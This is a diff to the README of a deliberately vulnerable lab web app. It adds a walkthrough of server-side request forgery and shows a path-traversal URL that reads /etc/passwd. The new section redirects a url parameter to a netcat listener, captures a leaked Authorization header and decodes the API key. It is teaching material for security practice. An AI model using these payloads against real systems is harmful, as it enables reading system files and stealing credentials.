@@ -67,6 +67,26 @@ Try accessing:
 http://127.0.0.1/vulnblog/index.php?page=../../../../../../../../etc/passwd
 ```
 
+### 2021 - Server-Side Request Forgery (SSRF)
+Clicking on Dogs sends a GET Request with an imaginery API Key to the dog ceo API.
+The URL looks like that: http://localhost/vulnblog/index.php?page=dogs.php&url=https://dog.ceo/api/breeds/image/random
+
+We can change the url to our own webserver: &url=http://localhost:8888
+
+Start a listener, resend the request and retrieve the secret:
+```bash
+alex@kali:~/VulnBlog$ nc -lvnp 8888                                  
+listening on [any] 8888 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60404
+GET / HTTP/1.1
+Host: localhost:8888
+Authorization: Basic VG9wU2VjcmV0QXBpS2V5ITo=
+Accept: */*
+
+alex@kali:~/VulnBlog$ echo "VG9wU2VjcmV0QXBpS2V5ITo=" | base64 -d    
+TopSecretApiKey!:
+```
+
 ## Database
 For further information see `./database/db.sql`.
 
